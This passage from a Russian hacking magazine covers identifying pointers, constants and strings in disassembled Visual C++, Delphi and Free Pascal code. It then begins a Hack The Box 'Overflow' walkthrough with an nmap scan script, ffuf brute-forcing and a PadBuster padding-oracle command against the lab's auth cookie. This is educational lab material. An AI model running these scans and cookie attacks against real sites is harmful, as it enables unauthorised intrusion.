Присваиваем значение переменной var_4, учитывая, что в регистре ECX
передается параметр, var_4 — аргумент:


mov     [rbp+var_4], ecx

Присваиваем значение переменной var_8, учитывая, что в регистре EDX
передается параметр, var_8 — аргумент:


                mov     [rbp+var_8], edx


; В ECX размещаем первое слагаемое
                mov     ecx, [rbp+var_4]
; Выполняем сложение с переменной, записывая сумму на место первого
слагаемого
                add     ecx, [rbp+var_8]
; Значение суммы копируем в переменную var_C
                mov     [rbp+var_C], ecx
; В качестве результата возвращаем сумму
                mov     eax, [rbp+var_C]
; Удаляем содержимое стека
                add     rsp, 10h
; Закрываем кадр стека
                pop     rbp
                retn
func(int, int)  endp


Сложные случаи адресации или математические операции с
указателями
C/C++ и некоторые другие языки программирования допускают выполнение
над указателями различных арифметических операций, чем серьезно зат‐
рудняют идентификацию типов непосредственных операндов. В самом деле,
если бы такие операции с указателями были запрещены, то любая матема‐
тическая  инструкция, манипулирующая с  непосредственным  операндом,
однозначно указывала бы на его константный тип.
  К счастью, даже в тех языках, где это разрешено, над указателями выпол‐
няется ограниченное число математических операций. Так, совершенно бес‐
смысленно  сложение  двух  указателей,  а  уж  тем  более  умножение
или деление их друг на друга. Вычитание — дело другое. Используя тот факт,
что компилятор располагает функции в памяти согласно порядку их объявле‐
ния в программе, можно вычислить размер функции, отнимая ее указатель
от указателя на следующую функцию. Такой трюк встречается в упаковщиках
(распаковщиках) исполняемых файлов, защитах с самомодифицирующимся
кодом, но в прикладных программах используется редко.





  Использование вычитания указателей для вычисления размера функции
  (структуры данных)




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ

  ФУНДАМЕНТАЛЬНЫЕ
  ОСНОВЫ ХАКЕРСТВА
                 КАК ИСКАТЬ ОПЕРАНДЫ ПРИ ВЗЛОМЕ
                                 ПРОГРАММ




Сказанное выше относилось к случаям «указатель + указатель». Между тем
указатель может сочетаться и с константой. Причем такое сочетание настоль‐
ко популярно, что процессоры серии 80x86 даже поддерживают для этого
специальную адресацию — базовую. Пусть, к примеру, имеется указатель
на массив и индекс некоторого элемента массива. Очевидно: чтобы получить
значение этого элемента, необходимо сложить указатель с индексом, умно‐
женным на размер элемента.
   Вычитание константы из указателя встречается гораздо реже: этому соот‐
ветствует меньший круг задач, и сами программисты избегают вычитания,
поскольку оно нередко приводит к серьезным проблемам. Среди новичков
популярен следующий прием: если им требуется массив, начинающийся
с единицы, они, объявив обычный массив, получают на него указатель и...
уменьшают его на единицу! Элегантно, не правда ли?
  Но подумай, что произойдет, если указатель на массив будет равен нулю.
Правильно, змея  укусит свой хвост — указатель станет очень большим
положительным числом. Вообще‑то под Windows NT массив гарантированно
не может быть размещен по нулевому смещению, но не стоит привыкать
к трюкам, привязанным к одной платформе и не работающим на других.
   «Нормальные» языки программирования запрещают смешение типов,
и правильно делают. Существует и еще одна фундаментальная проблема
дизассемблирования —  определение  типов  в  комбинированных
выражениях. Рассмотрим следующий пример:


MOV EAX, 0x...
MOV EBX, 0x...
ADD EAX, EBX
MOV ECX, [EAX]

Сумма двух непосредственных значений здесь используется для косвенной
адресации. Ну, положим, оба они указателями быть не могут, исходя из самых
общих соображений. Наверняка одно из непосредственных значений — ука‐
затель на массив (структуру данных, объект), а другое — индекс в этом мас‐
сиве. Для сохранения работоспособности программы указатель необходимо
заменить смещением метки, а вот индекс придется оставить без изменений
(ведь индекс — это константа).
   Как же различить, что есть что? Увы, нет универсального ответа, а в кон‐
тексте приведенного выше примера это и вовсе невозможно!
   Рассмотрим следующий пример, демонстрирующий определение типов
в комбинированных выражениях (combined_exp_types):


void MyFunc(char* a, int i)
{
    a[i] = '\n';
    a[i + 1] = 0;
}


int main()
{
    static char buff[] = "Hello,Sailor!";
    MyFunc(&buff[0], 5);
}

Результат компиляции с помощью Microsoft Visual C++ должен выглядеть так:


main            proc near
; Выделение памяти для локальных переменных
                sub     rsp, 28h
; Определяем смещение — указатель на элемент в массиве
                mov     eax, 1
                imul    rax, 0
; В регистр RCX загружаем указатель на строку
                lea     rcx, buff       ; "Hello, Sailor!"
                add     rcx, rax
; Указатель на строку копируется в RAX
                mov     rax, rcx
; Подготовка параметров:
; в регистр EDX помещается число 5 — второй параметр
                mov     edx, 5          ; i
; указатель на строку вновь копируется в RCX — первый параметр
                mov     rcx, rax        ; a
; Параметры укомплектованы — вызываем функцию
                call    MyFunc(char *,int)
; Функция возвращает ноль
                xor     eax, eax
; Очистка стека
                add     rsp, 28h
                retn
main            endp

Мы можем с полной уверенностью сказать, где какой параметр, только
в наших искусственных примерах. При изучении чужих программок такой уве‐
ренности, к сожалению, не будет. Поэтому, рассматривая параметры в фун‐
кции ниже, мы, по идее, должны видеть их как два числовых аргумента.
И наша задача разобраться, представляют ли они константы или указатели.


void MyFunc(char *, int) proc near
; Два параметра — все верно
arg_0           = qword ptr  8
arg_8           = dword ptr  10h
; Перенос значений параметров из регистров в память
                mov     [rsp+arg_8], edx ; Число 5
                mov     [rsp+arg_0], rcx ; Указатель на строку
; Копирование двойного слова со знаком в четверное
                movsxd  rax, [rsp+arg_8]
; Копирование четверного слова в четверное
                mov     rcx, [rsp+arg_0]

Сумма непосредственных значений используется для косвенной адресации
памяти, значит, это константа и указатель. Но кто есть кто?


mov     byte ptr [rcx+rax], 0Ah

Для ответа на этот вопрос нам необходимо понять смысл кода программы —
чего же добивался программист сложением указателей? Предположим, что
значение 5 — указатель. Логично? Да вот не очень‑то логично: если это ука‐
затель, то указатель на что?
   Первые 64 килобайта адресного пространства Windows NT заблокированы
для «отлавливания» нулевых и неинициализированных указателей. Ясно, что
равным пяти указатель быть никак не может, разве что программист исполь‐
зовал какой‑нибудь очень извращенный трюк. А если указатель 0x140003038
(фактический адрес buff)? Выглядит правдоподобным легальным смещени‐
ем...
   Кстати, что там у нас расположено? Секундочку...


.data:0000000140003038 buff            db 'Hello, Sailor!',0

Теперь все сходится — функции передан указатель на строку "Hello, Sailor!"
(значение 0x140003038) и индекс символа этой строки (значение 5). Функция
сложила указатель со строкой и записала в полученную ячейку символ "\n".
   Следующая инструкция заносит значение аргумента arg_8 в регистр EAX.
Как мы установили, это константа:


                mov     eax, [rsp+arg_8]


; Инкрементируем значение в EAX на 1
                inc     eax
; Преобразуем двойное слово (значение в EAX) в четверное слово (
значение в RAX)
                cdqe
; Помещаем в RCX значение аргумента arg_0
; Как мы выяснили, оно представляет собой указатель на строку
                mov     rcx, [rsp+arg_0]

Сумма RCX и RAX используется для косвенной адресации памяти, точнее кос‐
венно‑базовой, так как к указателю прибавляется еще и единица. В эту ячейку
памяти заносится ноль. Другими словами, мы прописываем ноль за сим‐
волом "\n".


                mov     byte ptr [rcx+rax], 0
                retn
void MyFunc(char *, int) endp

Наши предположения  подтвердились — функции передаются  указатель
на строку и индекс первого «отсекаемого» символа строки. А теперь ском‐
пилируем тот же самый пример компилятором Embarcadero C++Builder
и сравним, чем он отличается от Microsoft Visual C++:


; int __cdecl main(int argc, const char **argv, const char **envp)
                public main
main            proc near               ; DATA XREF: __acrtused+29↑o
var_10          = qword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
; Открытие кадра стека
                push    rbp
; Выделение 0х30 байт памяти для локальных переменных
                sub     rsp, 30h
; Копирование в RBP указателя на дно стека, ибо после вычитания
получилась вершина,
; а после сложения — дно
                lea     rbp, [rsp+30h]
; В RAX — указатель на строку
                lea     rax, aHelloSailor ; "Hello, Sailor!"
; В R8D — значение 5
                mov     r8d, 5
; Инициализация локальных переменных...
                mov     [rbp+var_4], 0
; ...перебрасываем содержимое регистров в память
                mov     [rbp+var_8], ecx
                mov     [rbp+var_10], rdx
; Готовим параметры для передачи:
; в RCX копируем указатель на строку...
                mov     rcx, rax
; ...в EDX — значение 5
                mov     edx, r8d
; Вызов функции вместе с передачей параметров
                call    MyFunc(char *,int)
                mov     [rbp+var_4], 0
; Обнуляем EAX для возвращения нуля
                mov     eax, [rbp+var_4]
; Очищаем стек
                add     rsp, 30h
; Закрываем кадр стека
                pop     rbp
                retn
main            endp


; __int64 __fastcall MyFunc(char *, int)
                public MyFunc(char *, int)
MyFunc(char *, int) proc near           ; CODE XREF: main+2B↓p
var_C           = dword ptr -0Ch
var_8           = qword ptr -8
; Открытие кадра стека
                push    rbp
; Выделение памяти
                sub     rsp, 10h
; Указатель кадра стека
                lea     rbp, [rsp+10h]
; Принятые параметры размещаем в локальных переменных
                mov     [rbp+var_8], rcx
                mov     [rbp+var_C], edx
; Первый параметр возвращаем в RCX
                mov     rcx, [rbp+var_8]
; Копирование двойного слова со знаком в четверное
                movsxd  rax, [rbp+var_C]

Сумма непосредственных значений используется для косвенной адресации
памяти. Этот прием мы уже проходили, разбирая дизассемблерный листинг
от Visual C++. Однако вопрос все тот же: как понять, где константа, а где ука‐
затель? Как и в предыдущем случае, необходимо проанализировать их зна‐
чения.


                mov     byte ptr [rcx+rax], 0Ah
; Копирование значений из локальных переменных в регистры
                mov     rax, [rbp+var_8]
                mov     edx, [rbp+var_C]
; Увеличение var_C на 1, а Visual C++ в этом месте использовал
инструкцию inc
                add     edx, 1
; Копирование двойного слова со знаком в четверное
                movsxd  rcx, edx
; Снова косвенная адресация памяти, чтобы поставить после символа
новой строки "\n" 0
                mov     byte ptr [rax+rcx], 0
; Восстановление стека
                add     rsp, 10h
; Закрытие кадра стека
                pop     rbp
                retn
MyFunc(char *, int) endp

По сравнению с листингом от  Visual C++ листинг от C++Builder имеет
минимальные различия. Раньше было не так... Даже не знаю, радоваться это‐
му или огорчаться.


Порядок индексов и указателей
Открою маленький секрет: при сложении указателя с константой большинс‐
тво компиляторов на первое место помещают указатель, а на второе — кон‐
станту, каким бы ни было их расположение в исходной программе. Иначе
говоря, выражения a[i], (a+i)[0], *(a+i) и *(i+a) компилируются в один
и тот же код! Даже если извратиться и написать так: (0)[i+a], компилятор
все равно выдвинет a на первое место. Что это — ослиное упрямство, игра
случая или фича? Ответ до смешного прост — сложение указателя с констан‐
той дает указатель! Поэтому результат вычислений всегда записывается
в переменную типа «указатель».
   Вернемся       к       последнему       рассмотренному      примеру
(combined_exp_types_cb), применив для анализа наше новое правило:


; Копирование значений из локальных переменных в регистры
                mov     rax, [rbp+var_8] ; В RAX теперь указатель на
строку
                mov     edx, [rbp+var_C]
; Увеличение var_C на 1, а там (следовательно, теперь в регистре)
значение 5
                add     edx, 1
; Копирование двойного слова со знаком в четверное
                movsxd  rcx, edx ; теперь значение 6 в RCX

Сложение RAX и RCX. Операция сложения указывает на то, что по крайней
мере один из них константа, а другой — либо константа, либо указатель.


mov     byte ptr [rax+rcx], 0

Ага! Сумма непосредственных значений используется для косвенной адре‐
сации памяти, значит, это константа и указатель. Но кто из них кто? С боль‐
шой степенью вероятности RAX — указатель (так оно и есть), поскольку он
стоит на первом месте, а RCX — индекс, так как он стоит на втором!


Использование LEA для сложения констант
Инструкция LEA широко используется компиляторами не только для ини‐
циализации указателей, но и для сложения констант. Поскольку внутренне
представление констант и указателей идентично, результат сложения двух
указателей идентичен сумме тождественных им констант. То есть LEA EBX, [
EBX+0x666] == ADD EBX, 0x666, однако по своим функциональным воз‐
можностям LEA значительно обгоняет ADD. Вот, например, LEA  ESI,  [
EAX*4+EBP-0x20], попробуй то же самое «скормить» инструкции ADD!
   Встретив в тексте программы команду LEA, не торопись навешивать
на возвращенное ею значение ярлык «указатель»: с не меньшим успехом он
может оказаться и константой! Если «подозреваемый» ни разу не использует‐
ся в выражении косвенной адресации — никакой это не указатель, а самая
настоящая константа!


«Визуальная» идентификация констант и указателей
Вот несколько приемов, помогающих отличить указатели от констант.
 1. В 64-разрядных Windows-программах указатели могут принимать огра‐
   ниченный диапазон значений. Доступный процессорам регион адресного
   пространства начинается со смещения
   0x00000000  00010000  и  простирается  до  смещения  0x000003FF
   FFFFFFFF.   Поэтому   все   непосредственные   значения,   меньшие
   0x00000000 00010000 и большие 0x000003FF FFFFFFFF, представляют
   собой константы, а не указатели. Исключение составляет число ноль,
   обозначающее  нулевой  указатель.  Некоторые  защитные  механизмы
   непосредственно  обращаются  к  коду  операционной  системы,  рас‐
   положенному выше адреса 0x000003FF FFFFFFFF, где начинаются вла‐
   дения ядра.
 2. Если непосредственное значение  смахивает на  указатель, посмотри,
   на что он указывает. Если по данному смещению находится пролог фун‐
   кции или осмысленная текстовая строка, скорее всего, мы имеем дело
   с указателем, хотя, может быть, это всего лишь совпадение.
 3. Загляни в таблицу перемещаемых элементов. Если адрес «подследствен‐
   ного» непосредственного значения есть в таблице, это, несомненно, ука‐
   затель. Беда в том, что большинство исполняемых файлов неперемеща‐
  емы и такой прием актуален лишь для исследования DLL (а DLL переме‐
  щаемы по определению).

К слову сказать, дизассемблер IDA Pro использует все три описанных спо‐
соба для автоматического опознавания указателей.


ЗАКЛЮЧЕНИЕ
Как мы  увидели выше,  правильное определение  констант и смещений
зависит от многих фундаментальных факторов: от операционной системы, ее
разрядности, даже от языка ассемблера, в котором отражается процес‐
сорная  архитектура! Эти понятия составляют основу любой программы.
А рассмотренные в статье примеры показали важность их правильной иден‐
тификации.
ВЗЛОМ

  ФУНДАМЕНТАЛЬНЫЕ
          ОСНОВЫ
          ХАКЕРСТВА





                                                                    Крис Касперски
                                                                            Известный российский
                                                                                        хакер. Легенда ][, ex-
                                                                               редактор ВЗЛОМа. Также
                                                                               известен под псевдонимами
                                                                        мыщъх, nezumi (яп. 鼠,
                                                                           мышь), n2k, elraton, souriz,
                                                                                                        tikus, muss, farah, jardon,
                                                                               KPNC.

ИЩЕМ
ТЕСТОВЫЕ СТРОКИ
В ЧУЖОЙ ПРОГРАММЕ
                                                            Юрий Язев
                                                                      Широко известен под
                                                                          псевдонимом yurembo.
                                                                            Программист, разработчик
                                                                                  видеоигр, независимый
                                                                                исследователь. Старый автор
                                                                                журнала «Хакер».
                                                                                    yazevsoft@gmail.com





Когда изучаешь дизассемблированный листинг программы
в целях понять, как она работает, очень часто нужно отыс‐
кать в ней строки. В сегодняшней статье мы рассмотрим,
какие типы строк существуют, из каких символов они могут
состоять, какого размера бывают символы и чем отличается
строка от простого набора байтов. Еще мы обсудим хра‐
нение, передачу и обработку строк разными компиляторами.


Фундаментальные основы хакерства
Пятнадцать лет назад эпический труд Криса Касперски «Фундаментальные
основы хакерства» был настольной книгой каждого начинающего исследова‐
теля в области компьютерной безопасности. Однако время идет, и знания,
опубликованные Крисом, теряют актуальность. Редакторы «Хакера» попыта‐
лись обновить этот объемный труд и перенести его из времен Windows
2000 и Visual Studio 6.0 во времена Windows 10 и Visual Studio 2019.
   Ссылки на другие статьи из этого цикла ищи на странице автора.


Казалось бы, что может быть сложного в идентификации строк? Если то,
на что ссылается указатель, выглядит как строка, это и есть строка! Более
того, в подавляющем большинстве случаев строки обнаруживаются и иден‐
тифицируются тривиальным просмотром дампа программы (при условии,
конечно, что они не зашифрованы, но шифрование — тема отдельного раз‐
говора). Так‑то оно так, да не все столь просто!
   Задача номер один — автоматизированное выявление строк в программе:
не пролистывать же мегабайтовые дампы вручную? Существует множество
алгоритмов идентификации строк. Самый простой (но не самый надежный)
основан на двух тезисах:
 • строка состоит из ограниченного ассортимента символов. В грубом приб‐
   лижении — это цифры, буквы алфавита (включая пробелы), знаки препина‐
   ния и служебные символы наподобие табуляции или возврата каретки;
 • строка должна состоять по крайней мере из нескольких символов.

Условимся  считать минимальную длину строки равной N байтам. Тогда
для автоматического выявления всех строк достаточно отыскать все пос‐
ледовательности из N и более «строковых» символов. Весь вопрос в том,
чему должна быть равна N и какие символы считать «строковыми».
   Если N имеет малое значение, порядка трех‑четырех байтов, то мы
получим очень большое количество ложных срабатываний. Напротив, когда N
велико, порядка шести‑восьми байтов, число ложных срабатываний близко
к нулю и ими можно пренебречь, но все короткие строки, например OK, YES,
NO, окажутся не распознаны! Другая проблема: помимо знако‑цифровых сим‐
волов, в строках встречаются и элементы псевдографики (особенно часты
они в  консольных  приложениях) и  всякие там  «мордашки»,  «стрелки»,
«карапузики» — словом, почти вся таблица ASCII. Чем же тогда строка отли‐
чается от случайной последовательности байтов? Частотный анализ здесь
бессилен: ему для нормальной работы требуется как минимум сотня байтов
текста, а мы говорим о строках из двух‑трех символов!
   Зайдем с другого конца. Если в программе есть строка, значит, на нее
кто‑нибудь да ссылается. А раз так, можно поискать среди непосредственных
значений указатель на распознанную строку. И если он будет найден, шансы
на то, что это действительно именно строка, а не случайная последователь‐
ность байтов, резко возрастают. Все просто, не так ли?
   Просто, да не совсем! Рассмотрим следующий пример (writeln_d):


program writeln_d;
begin
  Writeln('Hello, Sailor!');
end.





                          Результат выполнения writeln_d

Откомпилируем этот пример. Хотелось бы сказать, любым Pascal-компилято‐
ром, только любой нам не подойдет, поскольку нам нужен бинарный код
под архитектуру x86-64. Это автоматически сужает круг подходящих ком‐
пиляторов. Даже популярный Free Pascal все еще не умеет билдить прог‐
раммы для Windows x64. Но не убирай его далеко, он нам еще пригодится.
  В таком случае нам придется воспользоваться Embarcadero Delphi 10.4.
Настрой  компилятор для  построения  64-битных  приложений и  загрузи
откомпилированный файл в дизассемблер:





IDA       определила,       что      перед      вызовом       функции
_ZN6System14_Write0UStringERNS_8TTextRecENS_13UnicodeStringE
в регистр RDX загружается указатель на смещение aHelloSailor. Пос‐
мотрим, куда оно указывает (дважды щелкнем по нему):


.text:000000000040E6DC aHelloSailor: ; DATA XREF:
_ZN9Writeln_d14initializationEv+26↑o
.text:000000000040E6DC text "UTF-16LE", 'Hello, Sailor!',0

Ага! Текст в кодировке UTF-16LE. Что такое UTF-16, думаю, всем понятно. Два
конечных символа обозначают порядок байтов. В данном случае, поскольку
приложение скомпилировано для архитектуры x86-64, в которой использует‐
ся порядок байтов «от младшего к старшему» — little endian, упомянутые сим‐
волы говорят  именно об  этом. В  противоположном  случае, например
на компьютере с процессором SPARC, кодировка имела бы название UTF-
16BE от big endian.
  Из  этого  следует, что  Delphi  кодирует  каждый  символ переменным
количеством байтов: 2 или 4. Посмотрим, как себя поведет Visual C++
2019 с аналогичным кодом:


#include <stdio.h>


int main() {
  printf("%s", "Hello, Sailor!");
}

Результат дизассемблирования:


main proc near
     sub     rsp, 28h
     lea     rdx, aHelloSailor ; "Hello, Sailor!"
     lea     rcx, _Format      ; "%s"
     call    printf
     xor     eax, eax
     add     rsp, 28h
     retn
main endp

Поинтересуемся, что находится в сегменте данных только для чтения (rdata)
по смещению aHelloSailor:


.rdata:0000000140002240 aHelloSailor    db 'Hello, Sailor!',0 ; DATA
XREF: main+4↑o

Никаких дополнительных сведений о размере символов. Из этого можно сде‐
лать  вывод,  что  используется  стандартная  8-битная  кодировка  ASCII,
в которой под каждый символ отводится только 1 байт.
   Ядро Windows NT изначально использовало для работы со строковыми
символами кодировку UTF-16, однако до Windows 10 в пользовательском
режиме применялись две кодировки: UTF-16 и ASCII (нижние 128 символов
для  английского  языка,  верхняя  половина —  для  русского).  Начиная
с Windows 10, в user mode используется только UTF-16. Между тем символы
могут храниться и в ASCII, что мы видели в примере выше.
  В C/C++ char является исходным типом символа и позволяет хранить
любой символ нижней и верхней частей кодировки ASCII размером 8 бит.
Хотя реализация типа wchar_t полностью лежит на совести разработчика
компилятора, в Visual C++ он представляет собой полный аналог символа
кодировки UTF-16LE, то есть позволяет хранить любой символ Юникода.
  Для демонстрации двух основных символьных типов в Visual C++ напишем
элементарный пример:


#include <iostream>


int main() {
  std::cout << "size of 'char': " << sizeof(char) << "\n";
  std::cout << "size of 'wchar': " << sizeof(wchar_t) << "\n";


  char line1[] = "Hello, Sailor!";
  wchar_t line2[] = L"Hello, Sailor!";


  std::cout << "size of 'array of chars': " << sizeof(line1) << "\n";
  std::cout << "size of 'array of wchars': " << sizeof(line2) << "\n"
;
}

Результат его выполнения представлен ниже.





                      Размеры символьных данных

Думаю, все понятно без подробных пояснений: char — 1 байт, wchar_t —
2 байта. Строка "Hello, Sailor!" состоит из 14 символов, плюс конечный 0.
Это также отражено в выводе программы.


             INFO

                   В стандарте C++ есть типы символов: char8_t,
                   char16_t, char32_t.  Первый  из  них  был
                         добавлен с введением стандарта C++20, два
                            других добавлены в C++11. Их размер отражает‐
                        ся  в  их  названиях: char16_t  используется
                       для символов кодировки UTF-16, char32_t —
                       для UTF-32. При этом char8_t не то же самое,
                         что  «унаследованный» char,  хотя  позволяет
                        работать с символами последнего, главным обра‐
                     зом он предназначен для литералов кодировки
                    UTF-8.


Размеры символов важны для обнаружения границ строк при анализе дизас‐
семблерных листингов программ.
   Можно сделать вывод, что современные Visual C++ и Delphi оперируют
одинаковыми типами строк, неважно какого размера, но оканчивающиеся
символом 0. Но так было не всегда. В качестве исторического экскурса
откомпилируем пример writeln_d компилятором Free Pascal.





                            Среда Free Pascal

Загрузим результат в IDA.





     IDA определила, что загружаемый исполняемый файл 32-разрядный


_main proc near
argc  = dword ptr  8
argv  = dword ptr  0Ch
envp  = dword ptr  10h
      push    ebp
      mov     ebp, esp
      push    ebx
      call    FPC_INITIALIZEUNITS
      call    fpc_get_output
      mov     ebx, eax
      mov     ecx, offset _$WRITELN_FP$_Ld1
      mov     edx, ebx
      mov     eax, 0
      call    FPC_WRITE_TEXT_SHORTSTR
      call    FPC_IOCHECK
      mov     eax, ebx
      call    fpc_writeln_end
      call    FPC_IOCHECK
      call    FPC_DO_EXIT
_main endp

Так‑так‑так… какой интересный код для нас приготовил Free Pascal! Сразу же
бросается в глаза смещение


_$WRITELN_FP$_Ld1

адрес  которого помещается в регистр ECX перед вызовом  процедуры
FPC_WRITE_TEXT_SHORTSTR, своим названием намекающей на вывод текста.
Постой, ведь это же 32-разрядная программа, где передача параметров
в регистрах скорее исключение, чем правило, и используется только при сог‐
лашении fastcall, в остальных же случаях параметры передаются через стек!
   Заглянем‑ка в документацию по компилятору… Есть контакт! По умол‐
чанию в коде механизма вызова процедур для процессоров i386 использует‐
ся соглашение register. У нормальных людей оно называется fastcall. И, пос‐
кольку для платформы x86 оно не стандартизировано, в отличие от x64,
для передачи параметров используются все свободные регистры! Поэтому
в том, что используется регистр ECX, нет ничего сверхъестественного.
   Чтобы окончательно убедиться в нашей догадке, посмотрим, как рас‐
поряжается     переданным     параметром     вызываемая     функция
FPC_WRITE_TEXT_SHORTSTR:


FPC_WRITE_TEXT_SHORTSTR proc near
    ; CODE XREF: _main+1C↑p
    ; sub_403320+31↑p ...
    push    ebx
    push    esi
    push    edi
    mov     ebx, eax
    mov     esi, edx
    mov     edi, ecx ; Копирование параметра в регистр EDI

Но тут много чего копируется, поэтому эта инструкция не доказательство.
Смотрим дальше.


    mov     edx, ds:FPC_THREADVAR_RELOCATE
    test    edx, edx
    jz      short loc_40661C
    mov     eax, ds:U_$SYSTEM_$$_INOUTRES
    call    edx ; FPC_THREADVAR_RELOCATE
    jmp     short loc_406621


;
---------------------------------------------------------------------
------
loc_40661C: ; CODE XREF: FPC_WRITE_TEXT_SHORTSTR+11↑j
    mov     eax, offset unk_40B154
loc_406621: ; CODE XREF: FPC_WRITE_TEXT_SHORTSTR+1A↑j
    cmp     word ptr [eax], 0
    jnz     loc_4066AC
    mov     eax, [esi+4]
    cmp     eax, 0D7B1h
    jl      short loc_40668C
    sub     eax, 0D7B1h
    jz      short loc_40666C
    sub     eax, 1
    jnz     short loc_40668C
    mov     esi, esi

Ага! Следующая инструкция копирует указатель, преобразуя его в 32-раз‐
рядное значение без учета знака (указатель не может быть отрицательным).
Затем с помощью команды cmp сравниваются значения двух регистров: EAX
и EBX. И если EAX больше или равен EBX, выполняется переход на метку
loc_40665C...


    movzx   eax, byte ptr [edi]
    cmp     eax, ebx
    jge     short loc_40665C
    movzx   eax, byte ptr [edi]
    mov     edx, ebx
    sub     edx, eax
    mov     eax, esi
    call    sub_4064F0
    lea     esi, [esi+0]
loc_40665C: ; CODE XREF: FPC_WRITE_TEXT_SHORTSTR+49↑j

...где происходит похожая на манипуляцию со строкой деятельность.


    movzx   ecx, byte ptr [edi]
    lea     edx, [edi+1]
    mov     eax, esi
    call    sub_406460
    ...

Теперь мы смогли убедиться в правильности нашего предположения! Вер‐
немся  к  основному  исследованию  и  посмотрим,  что же  скрывается
под подозрительным смещением:


.rdata:00409004  _$WRITELN_FP$_Ld1 db  0Eh ; DATA XREF: _main+10↑o
.rdata:00409005  db  48h ; H
.rdata:00409006  db  65h ; e
.rdata:00409007  db  6Ch ; l
.rdata:00409008  db  6Ch ; l
.rdata:00409009  db  6Fh ; o
.rdata:0040900A  db  2Ch ; ,
.rdata:0040900B  db  20h
.rdata:0040900C  db  53h ; S
.rdata:0040900D  db  61h ; a
.rdata:0040900E  db  69h ; i
.rdata:0040900F  db  6Ch ; l
.rdata:00409010  db  6Fh ; o
.rdata:00409011  db  72h ; r
.rdata:00409012  db  21h ; !
.rdata:00409013  db    0

Согласись, не это мы ожидали увидеть. Однако последовательное рас‐
положение символов строки «в столбик» дела не меняет. Интересен другой
момент: в начале строки стоит число, показывающее количество символов
в строке, — 0xE (14 в десятичной системе).
   Оказывается, мало идентифицировать строку, требуется еще как минимум
определить ее границы.


                                     Продолжение статьи →
ВЗЛОМ

        HTB
OVERFLOW





 УПРАЖНЯЕМСЯ В АТАКЕ PADDING ORACLE
   И ЭКСПЛУАТИРУЕМ БАГ В EXIFTOOL





В этой статье я покажу, как проводить атаку
padding  oracle и  эксплуатировать  сайты
через SQL-инъекцию. Затем мы получим
доступ   к  машине  через   уязвимость
в ExifTool и повысим привилегии на хосте             RalfHacker                                                                                             hackerralf8@gmail.com
через  переполнение  буфера  в  поль‐
зовательском приложении.


Полигоном нам послужит Overflow — машина с площадки Hack The Box, оце‐
ненная как сложная. Ее прохождение действительно оказалось несколько
запутанным.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts, чтобы было удобнее обращаться
к ней:


10.10.11.119    overflow.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Мы нашли три открытых порта:
 • 22 — служба OpenSSH 7.6p1;
 • 25 — служба Postfix SMTP;
 • 80 — веб‑сервер Apache 2.4.29.

К SSH доступа мы пока не имеем, что делать с SMTP-сервером на данном
этапе, тоже неясно, поэтому просматриваем веб.





                        Главная страница overflow.htb

На сайте доступна регистрация и авторизация. Выполним оба действия, что‐
бы получить доступ к новым функциям. После регистрации и входа на панели
сайта появятся новые ссылки на настройки профиля, а также какие‑то темати‐
ческие статьи.





                             Страница Profile





                              Страница Blog


Сканирование веб-контента
Ничего интересного не обнаружив, я решил просканировать каталоги и сай‐
ты. Это поможет нам найти скрытый администратором контент.

Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf. При запуске можно задать
следующие параметры:
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -fc — исключить из результата ответы с кодом 403.



Набираем команду


ffuf -u http://overflow.htb/home/FUZZ -t 256 -w php_files_common.txt





              Результат сканирования PHP-файлов с помощью ffuf

Мы нашли файл logs.php. Также я просканировал корневой каталог сайта
и получил дополнительно директорию config, которая пока что нам ничего
не дает.





                Результат сканирования каталогов с помощью ffuf

При попытке запросить содержимое logs.php получаем сообщение, что нам
закрыт доступ.





                            Страница logs.php


ТОЧКА ВХОДА
Переходим к более глубокому анализу технологий сайта. И обратим вни‐
мание на странную последовательность в cookie — auth.





                       Перехваченный запрос на сервер

Я попробовал провернуть разные манипуляции с этой строкой: декодирова‐
ние, частичное изменение, дополнение и урезание. В результате я наткнулся
на код ответа 302 и редирект на страницу logot.php с параметром err=1.





                                 Ответ сервера





                         Запрос после редиректа

Открыв эту страницу в браузере, обнаружим сообщение «Invalid padding», что
сразу наталкивает на мысль об атаке padding oracle.





                         Сообщение об ошибке


Padding oracle
Это атака на шифрование CBC, при котором сообщение разбивается на бло‐
ки длиной X байтов и каждый блок ксорится с предыдущим зашифрованным
блоком. Затем результат шифруется. Что очень важно, шифрование выпол‐
няется блоками фиксированного размера.
   Чтобы гарантировать  точное размещение  открытого  текста в одном
или нескольких блоках, часто используется дополнение (padding). Это допол‐
нение может быть выполнено несколькими способами (самый распростра‐
ненный — PKCS7). В PKCS7 дополнение будет состоять из одного и того же
числа: количества недостающих байтов.
   Например, если в открытом тексте отсутствуют два байта, то заполнение
будет \x02\x02. Суть атаки заключается в том, что мы, манипулируя данными
и получая информацию о  верности  дополнения, можем вскрыть весь
исходный текст.


        WWW

                        Подробнее  о  padding  oracle  attack  в  статье
                       на «Хабрахабре»: часть 1, часть 2.


Для работы будем использовать скрипт PadBuster. Я перерегистрировал
пользователя, получил куки и указал их этому чудо‑скрипту для работы.


padbuster http://overflow.htb/home/index.php
Ow%2F5zdCFrSoAl%2FO6Mo3gaD8Y79JztfUX 8 -cookies auth=
Ow%2F5zdCFrSoAl%2FO6Mo3gaD8Y79JztfUX





                               Запуск PadBuster

